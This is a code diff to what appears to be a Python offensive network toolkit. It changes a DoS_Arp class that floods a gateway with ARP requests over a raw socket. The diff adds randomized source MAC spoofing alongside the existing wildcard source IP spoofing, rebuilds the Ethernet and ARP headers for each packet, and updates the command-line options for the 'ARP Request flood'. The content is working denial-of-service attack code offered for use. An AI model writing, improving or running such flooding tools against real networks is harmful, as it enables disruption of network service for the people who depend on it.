@@ -1115,17 +1115,12 @@ class DoS_Arp :
         self._iface = self.iface = iface
         self._source = self.source = source
         self.gateway = gateway
-        self.srcmac = srcmac
+        self._srcmac = self.srcmac = srcmac
         self.num = number
         self.wait = wait
         self._count = Constant.COUNTER(0)
         self.dstmac = "ff:ff:ff:ff:ff:ff"
         self.hattype = 1
-        self.ethernet = self.ethernet_header(
-            dst = self.dstmac,
-            src = self.srcmac,
-            typ = 0x0806
-            )
         return
 
     def __repr__(self) -> str :
@@ -1148,6 +1143,17 @@ class DoS_Arp :
         return
 
     @property
+    def srcmac(self) -> str :
+        randnum = lambda : random.randint(0, 255)
+        mac = ":".join([f"{randnum():02x}" if (part == "*") else part for part in self._srcmac.split(":")])
+        return mac
+
+    @srcmac.setter
+    def srcmac(self, value : str) -> None :
+        self._srcmac = value
+        return
+
+    @property
     def source(self) -> str :
         randnum = lambda : random.randint(0, 255)
         ip = ".".join([str(randnum()) if (part == "*") else part for part in self._source.split(".")])
@@ -1158,22 +1164,8 @@ class DoS_Arp :
         self._source = value
         return
 
-    @property
-    def srcmac(self) -> bytes :
-        return self._srcmac
-
     @srcmac.setter
     def srcmac(self, value : str) -> None :
-        self._srcmac = binascii.unhexlify(value.replace(":", ""))
-        return
-
-    @property
-    def dstmac(self) -> bytes :
-        return self._dstmac
-
-    @dstmac.setter
-    def dstmac(self, value : str) -> None :
-        self._dstmac = binascii.unhexlify(value.replace(":", ""))
         return
 
     @property
@@ -1189,14 +1181,8 @@ class DoS_Arp :
         return
 
     @staticmethod
-    def ethernet_header(dst : str, src : str, typ : int) -> bytes :
-        return struct.pack("!6s6sH", dst, src, typ)
-
-    @staticmethod
-    def arp_header(htp : int, ptp : int, hln : int, pln : int, opt : int, sha : str, spa : str, tha : str, tpa : str) -> bytes :
-        spa = socket.inet_pton(socket.AF_INET, spa)
-        tpa = socket.inet_pton(socket.AF_INET, tpa)
-        return struct.pack("!HHBBH6s4s6s4s", htp, ptp, hln, pln, opt, sha, spa, tha, tpa)
+    def mac_to_bytes(mac : str) -> bytes :
+        return binascii.unhexlify(mac.replace(":", str()))
 
     @staticmethod
     def progress_bar(load_bar : str, x : int, y : int, /) -> None :
@@ -1217,8 +1203,24 @@ class DoS_Arp :
             socket.ETH_P_ALL = 3
         return
 
+    def ethernet_header(self, dst : str, src : str, typ : int) -> bytes :
+        dst = self.mac_to_bytes(dst)
+        src = self.mac_to_bytes(src)
+        return struct.pack("!6s6sH", dst, src, typ)
+
+    def arp_header(self, htp : int, ptp : int, hln : int, pln : int, opt : int, sha : str, spa : str, tha : str, tpa : str) -> bytes :
+        sha = self.mac_to_bytes(sha)
+        spa = socket.inet_pton(socket.AF_INET, spa)
+        tha = self.mac_to_bytes(tha)
+        tpa = socket.inet_pton(socket.AF_INET, tpa)
+        return struct.pack("!HHBBH6s4s6s4s", htp, ptp, hln, pln, opt, sha, spa, tha, tpa)
+
     def prepare(self) -> bytes :
-        eth = self.ethernet
+        eth = self.ethernet_header(
+            dst = self.dstmac,
+            src = self.srcmac,
+            typ = 0x0806
+            )
         arp = self.arp_header(
             htp = self.hattype,
             ptp = 0x0800,
@@ -1243,7 +1245,7 @@ class DoS_Arp :
             socket.ETH_P_ALL,
             socket.PACKET_HOST,
             self.hattype,
-            self.dstmac
+            self.mac_to_bytes(self.dstmac)
             )
         print("starting timer...", end = " ", flush = True)
         start_time = Constant.TIME()
@@ -1687,8 +1689,8 @@ if not Constant.MODULE :
         arp_tool = dos_subparser.add_parser("arp", help = "executes ARP Request flood")
         arp_tool.add_argument("-if", "--iface", type = str, required = True, help = "specifies network interface", metavar = Constant.IFACES)
         arp_tool.add_argument("-g", "--gateway", type = str, required = True, help = "gateway ip address to flood")
-        arp_tool.add_argument("-s", "--source", type = str, required = True, help = "ip can be specific like 192.168.1.1 or can be range like 192.168.*.*") 
-        arp_tool.add_argument("-sm", "--src-mac", type = str, required = True, help = "source MAC address of desired iface")
+        arp_tool.add_argument("-s", "--source", type = str, required = True, help = "wildcard source ip to flood", default = "*.*.*.*")
+        arp_tool.add_argument("-sm", "--src-mac", type = str, required = True, help = "wildcard source MAC address of desired iface")
         arp_tool.add_argument("-n", "--number", type = int, help = "sets number of datagrams and must be 32 bit", default = -1)
         arp_tool.add_argument("-w", "--wait", type = float, help = "sets time.sleep after each datagram", default = 0.0)
         arp_tool.set_defaults(func = DoS_Arp_args)
